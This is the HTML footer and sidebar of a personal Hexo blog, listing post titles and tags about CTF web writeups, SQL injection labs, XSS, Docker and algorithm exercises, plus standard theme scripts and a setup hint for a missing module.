            <span class="archive-post-date">02/01</span><a class="archive-post-title" href="/2019/02/01/Prompt-1-xss-通关记录/">Prompt 1 to win 通关记录</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/30</span><a class="archive-post-title" href="/2019/01/30/2019-Fireshell-Web-Vice/">2019 fireshell web Vice</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/30</span><a class="archive-post-title" href="/2019/01/30/安恒杯-一月-Web/">安恒杯 一月 web</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/02</span><a class="archive-post-title" href="/2019/01/02/POJ-2352-Stars-树状数组/">POJ 2352 Stars[树状数组]</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/02</span><a class="archive-post-title" href="/2019/01/02/POJ-2352-Stars-树状数组/">POJ 2352 Stars[树状数组]</a>
        </li>
    
    
    
    
    
        </ul>
    
    <div class="archive-year"> 2018 </div>
    <ul class="year-list">
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">12/30</span><a class="archive-post-title" href="/2018/12/30/2017-NJCTF-Guess/">2017 NJCTF web guess</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">12/30</span><a class="archive-post-title" href="/2018/12/30/Code-Breaking-Writeup/">Code Breaking Writeup</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">12/22</span><a class="archive-post-title" href="/2018/12/22/优雅实现哈夫曼编码/">优雅实现哈夫曼编码</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">12/08</span><a class="archive-post-title" href="/2018/12/08/Please_don't_stop_rua_233333/">Please don't stop rua 233333</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">11/30</span><a class="archive-post-title" href="/2018/11/30/Docker-常用命令/">Docker-常用命令清单</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">11/23</span><a class="archive-post-title" href="/2018/11/23/漏洞练习平台及工具/">漏洞练习平台及工具</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">11/02</span><a class="archive-post-title" href="/2018/11/02/Sqli-labs-通关记录/">Sqli-labs 通关笔记</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">10/28</span><a class="archive-post-title" href="/2018/10/28/POJ-3984-迷宫问题-BFS/">POJ 3984 迷宫问题[BFS]</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">10/28</span><a class="archive-post-title" href="/2018/10/28/POJ-1321-棋盘问题-DFS/">POJ 1321 棋盘问题[DFS]</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">10/23</span><a class="archive-post-title" href="/2018/10/23/Raccoon-Writeup/">Raccoon web Writeup</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">10/02</span><a class="archive-post-title" href="/2018/10/02/学习一项技能要花多少时间/">学习一项技能要花多少时间？</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/26</span><a class="archive-post-title" href="/2018/09/26/Bugku-Web-Writeup/">Bugku Web 部分WP</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">07/28</span><a class="archive-post-title" href="/2018/07/28/ACM-常用Trick/">ACM 常用小 Trick</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">05/16</span><a class="archive-post-title" href="/2018/05/16/十年学会编程/">Teach Yourself Programming in Ten Years</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/25</span><a class="archive-post-title" href="/2018/01/25/Hello-World/">Hello World</a>
        </li>
    
    </ul></div>
  </div>
        <div class="sidebar-panel-tags">
    <div class="sidebar-tags-name">
    
        <span class="sidebar-tag-name" data-tags="Writeup"><span class="iconfont-archer">&#xe606;</span>Writeup</span>
    
        <span class="sidebar-tag-name" data-tags="php 伪随机数"><span class="iconfont-archer">&#xe606;</span>php 伪随机数</span>
    
        <span class="sidebar-tag-name" data-tags="ssrf"><span class="iconfont-archer">&#xe606;</span>ssrf</span>
    
        <span class="sidebar-tag-name" data-tags="算法"><span class="iconfont-archer">&#xe606;</span>算法</span>
    
        <span class="sidebar-tag-name" data-tags="读书笔记"><span class="iconfont-archer">&#xe606;</span>读书笔记</span>
    
        <span class="sidebar-tag-name" data-tags="漏洞分析"><span class="iconfont-archer">&#xe606;</span>漏洞分析</span>
    
        <span class="sidebar-tag-name" data-tags="PHP"><span class="iconfont-archer">&#xe606;</span>PHP</span>
    
        <span class="sidebar-tag-name" data-tags="Docker"><span class="iconfont-archer">&#xe606;</span>Docker</span>
    
        <span class="sidebar-tag-name" data-tags="SQLi"><span class="iconfont-archer">&#xe606;</span>SQLi</span>
    
        <span class="sidebar-tag-name" data-tags="反序列化"><span class="iconfont-archer">&#xe606;</span>反序列化</span>
    
        <span class="sidebar-tag-name" data-tags="php"><span class="iconfont-archer">&#xe606;</span>php</span>
    
        <span class="sidebar-tag-name" data-tags="ThinkPHP"><span class="iconfont-archer">&#xe606;</span>ThinkPHP</span>
    
        <span class="sidebar-tag-name" data-tags="smarty"><span class="iconfont-archer">&#xe606;</span>smarty</span>
    
        <span class="sidebar-tag-name" data-tags="命令注入"><span class="iconfont-archer">&#xe606;</span>命令注入</span>
    
        <span class="sidebar-tag-name" data-tags="心得"><span class="iconfont-archer">&#xe606;</span>心得</span>
    
        <span class="sidebar-tag-name" data-tags="webshell"><span class="iconfont-archer">&#xe606;</span>webshell</span>
    
        <span class="sidebar-tag-name" data-tags="xss"><span class="iconfont-archer">&#xe606;</span>xss</span>
    
        <span class="sidebar-tag-name" data-tags="redis"><span class="iconfont-archer">&#xe606;</span>redis</span>
    
        <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
    
        <span class="sidebar-tag-name" data-tags="SSRF"><span class="iconfont-archer">&#xe606;</span>SSRF</span>
    
        <span class="sidebar-tag-name" data-tags="代码审计"><span class="iconfont-archer">&#xe606;</span>代码审计</span>
    
        <span class="sidebar-tag-name" data-tags="SQL"><span class="iconfont-archer">&#xe606;</span>SQL</span>
    
        <span class="sidebar-tag-name" data-tags="笔记"><span class="iconfont-archer">&#xe606;</span>笔记</span>
    
    </div>
    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
    缺失模块。<br>
    1、请确保node版本大于6.2<br>
    2、在博客根目录（注意不是archer根目录）执行以下命令：<br>
    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br>
    3、在根目录_config.yml里添加配置：
    <pre style="color: #787878; font-size: 0.6rem;">
jsonContent:
  meta: false
  pages: false
  posts:
    title: true
    date: true
    path: true
    text: false
    raw: false
    content: false
    slug: false
    updated: false
    comments: false
    link: false
    permalink: false
    excerpt: false
    categories: true
    tags: true</pre>
    </div> 
    <div class="sidebar-tags-list"></div>
</div>
        <div class="sidebar-panel-categories">
    <div class="sidebar-categories-name">
    
    </div>
    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
    <div class="sidebar-categories-list"></div>
</div>
    </div>
</div> 
    <script>
    var siteMeta = {
        root: "/",
        author: "wywwzjj"
    }
</script>
    <!-- CDN failover -->
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
    <script type="text/javascript">
        if (typeof window.$ === 'undefined')
        {
            console.warn('jquery load from jsdelivr failed, will load local script')
            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
        }
    </script>
    <script src="/scripts/main.js"></script>
    <!-- algolia -->
    
    <!-- busuanzi  -->
    
    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    
    <!-- CNZZ  -->
    
    </div>
    <!-- async load share.js -->
    
        <script src="/scripts/share.js" async></script>    
     
    </body>
</html>


